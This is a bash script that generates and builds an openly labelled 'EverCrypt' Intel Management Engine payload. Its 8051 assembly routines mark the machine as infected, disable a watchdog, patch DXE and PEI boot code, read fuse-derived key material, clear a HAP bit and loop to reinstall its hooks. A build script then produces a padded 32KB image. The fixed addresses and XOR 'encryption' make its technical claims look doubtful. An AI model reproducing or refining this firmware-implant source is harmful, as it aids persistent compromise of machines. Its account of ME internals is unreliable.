#!/bin/bash
set -e

echo "[*] Setting up EverCrypt ME Payload structure..."

# Create directories
mkdir -p src build linker

# Create evercrypt_me.s
cat > src/evercrypt_me.s << 'EOF'
;; ===========================================================================
;; EverCrypt Intel ME Payload - Pure Assembly
;; ===========================================================================

        .module evercrypt_me

        .equ ME_SIGNATURE,   0xFFF0
        .equ ME_BOOT_COUNT,  0xFFF8
        .equ WDT_CTRL,       0x0800
        .equ HECI_CSR,       0x2000
        .equ DXE_ENTRY,      0x0000
        .equ ME_FUSE_BASE,   0x1000
        .equ HAP_BIT_ADDR,   0x1300

        .area CSEG (ABS,CODE)
        .org 0x0000

RESET::
        ljmp    MAIN

        .org 0x0030

MAIN::
        mov     dptr, #WDT_CTRL
        clr     a
        movx    @dptr, a

        lcall   MARK_INFECTION
        lcall   INSTALL_DXE_HOOKS
        lcall   DERIVE_ME_KEY
        lcall   BYPASS_HAP_BIT
        ljmp    PERSISTENCE_LOOP

MARK_INFECTION:
        mov     dptr, #ME_SIGNATURE
        mov     a, #0x45
        movx    @dptr, a
        inc     dptr
        mov     a, #0x43
        movx    @dptr, a
        inc     dptr
        mov     a, #0x52
        movx    @dptr, a
        inc     dptr
        mov     a, #0x59
        movx    @dptr, a
        inc     dptr
        mov     a, #0x50
        movx    @dptr, a
        inc     dptr
        mov     a, #0x54
        movx    @dptr, a
        mov     dptr, #ME_BOOT_COUNT
        movx    a, @dptr
        inc     a
        movx    @dptr, a
        ret

INSTALL_DXE_HOOKS:
        mov     dptr, #HECI_CSR
        mov     a, #0x01
        movx    @dptr, a
        mov     dptr, #DXE_ENTRY
        mov     a, #0xEA
        movx    @dptr, a
        inc     dptr
        mov     a, #0x00
        movx    @dptr, a
        inc     dptr
        mov     a, #0x10
        movx    @dptr, a
        inc     dptr
        mov     a, #0x00
        movx    @dptr, a
        inc     dptr
        mov     a, #0x00
        movx    @dptr, a
        ret

DERIVE_ME_KEY:
        mov     dptr, #ME_FUSE_BASE
        mov     r0, #0x30
        mov     r7, #0x20
DERIVE_LOOP:
        movx    a, @dptr
        mov     @r0, a
        inc     dptr
        inc     r0
        djnz    r7, DERIVE_LOOP
        mov     r0, #0x30
        mov     r7, #0x20
MIX_LOOP:
        mov     a, @r0
        xrl     a, #0xA5
        rl      a
        mov     @r0, a
        inc     r0
        djnz    r7, MIX_LOOP
        ret

BYPASS_HAP_BIT:
        mov     dptr, #HAP_BIT_ADDR
        movx    a, @dptr
        anl     a, #0xFE
        movx    @dptr, a
        mov     dptr, #(HAP_BIT_ADDR+4)
        mov     a, #0x01
        movx    @dptr, a
        ret

PERSISTENCE_LOOP:
        mov     dptr, #DXE_ENTRY
        movx    a, @dptr
        cjne    a, #0xEA, REINSTALL_DXE
        sjmp    PERSISTENCE_LOOP

REINSTALL_DXE:
        lcall   INSTALL_DXE_HOOKS
        sjmp    PERSISTENCE_LOOP

        .org 0x7FF0
SIGNATURE::
        .ascii  "EVERCRYPT-ME-2025"
        .byte   0xDE, 0xAD, 0xC0, 0xDE
EOF

# Create me_hooks.s
cat > src/me_hooks.s << 'EOF'
;; ===========================================================================
;; EverCrypt ME Hooks
;; ===========================================================================

        .module me_hooks
        .area CSEG (CODE)
        .globl _PATCH_DXE_RUNTIME

_PATCH_DXE_RUNTIME::
        mov     dptr, #0x1020
        mov     a, #0xC3
        movx    @dptr, a
        inc     dptr
        mov     a, #0x00
        movx    @dptr, a
        inc     dptr
        mov     a, #0x20
        movx    @dptr, a
        ret

        .globl _PATCH_PEI_PHASE

_PATCH_PEI_PHASE::
        mov     dptr, #0x0100
        mov     a, #0x90
        movx    @dptr, a
        ret
EOF

# Create me_crypto.s
cat > src/me_crypto.s << 'EOF'
;; ===========================================================================
;; EverCrypt ME Crypto
;; ===========================================================================

        .module me_crypto
        .area CSEG (CODE)
        .area CONST (CODE)
        .globl _ME_ENCRYPT_BLOCK

_ME_ENCRYPT_BLOCK::
        mov     r7, #0x10
ENCRYPT_LOOP:
        mov     a, @r0
        xrl     a, #0x63
        xrl     a, r7
        mov     @r1, a
        inc     r0
        inc     r1
        djnz    r7, ENCRYPT_LOOP
        ret

        .area CONST (CODE)
SBOX_TABLE::
        .byte 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5
        .byte 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76
EOF

# Create build script
cat > build/build_me.sh << 'EOF'
#!/bin/bash
set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] EverCrypt ME Payload Builder${NC}"
echo "========================================"

# Verify assembler
if ! command -v sdas8051 &> /dev/null; then
    echo -e "${RED}[!] sdas8051 not found${NC}"
    echo "Install: sudo pacman -S sdcc"
    exit 1
fi

# Clean
echo -e "${YELLOW}[*] Cleaning...${NC}"
rm -f *.rel *.lst *.hlr *.ihx *.map *.mem *.rst *.sym *.bin *.asm

# Assemble
echo -e "${YELLOW}[*] Assembling evercrypt_me.s...${NC}"
sdas8051 -plosgff ../src/evercrypt_me.s

echo -e "${YELLOW}[*] Assembling me_hooks.s...${NC}"
sdas8051 -plosgff ../src/me_hooks.s

echo -e "${YELLOW}[*] Assembling me_crypto.s...${NC}"
sdas8051 -plosgff ../src/me_crypto.s

# Check assembly
if [ ! -f evercrypt_me.rel ]; then
    echo -e "${RED}[!] Assembly failed - evercrypt_me.rel not created${NC}"
    exit 1
fi

echo -e "${GREEN}[✓] Assembly complete${NC}"

# Link
echo -e "${YELLOW}[*] Linking...${NC}"
sdld -n -i evercrypt_me.ihx evercrypt_me.rel me_hooks.rel me_crypto.rel

if [ ! -f evercrypt_me.ihx ]; then
    echo -e "${RED}[!] Linking failed${NC}"
    exit 1
fi

# Convert
echo -e "${YELLOW}[*] Converting to binary...${NC}"
objcopy -I ihex -O binary evercrypt_me.ihx evercrypt_me.bin 2>/dev/null || {
    # Try srecord if objcopy fails
    srec_cat evercrypt_me.ihx -intel -o evercrypt_me.bin -binary 2>/dev/null || {
        echo -e "${RED}[!] Conversion failed. Install: sudo pacman -S srecord${NC}"
        exit 1
    }
}

SIZE=$(stat -c%s evercrypt_me.bin 2>/dev/null || stat -f%z evercrypt_me.bin)
echo -e "${YELLOW}[*] Binary size: ${SIZE} bytes${NC}"

# Pad
echo -e "${YELLOW}[*] Padding to 32KB...${NC}"
dd if=/dev/zero of=evercrypt_me_padded.bin bs=32768 count=1 2>/dev/null
dd if=evercrypt_me.bin of=evercrypt_me_padded.bin conv=notrunc 2>/dev/null

# Signature
echo -n "EVERCRYPT-ME-$(date +%Y%m%d)" | dd of=evercrypt_me_padded.bin bs=1 seek=32750 conv=notrunc 2>/dev/null

HASH=$(sha256sum evercrypt_me_padded.bin | cut -d' ' -f1 | head -c16)

echo ""
echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║        BUILD SUCCESSFUL                ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
echo ""
echo "Output:   evercrypt_me_padded.bin"
echo "Size:     32768 bytes"
echo "Code:     ${SIZE} bytes"
echo "SHA256:   ${HASH}"
echo ""
echo "Verify:"
echo "  hexdump -C evercrypt_me_padded.bin | head -n 30"
echo ""
EOF

chmod +x build/build_me.sh

echo "[✓] Setup complete!"
echo ""
echo "Next steps:"
echo "  cd build"
echo "  ./build_me.sh"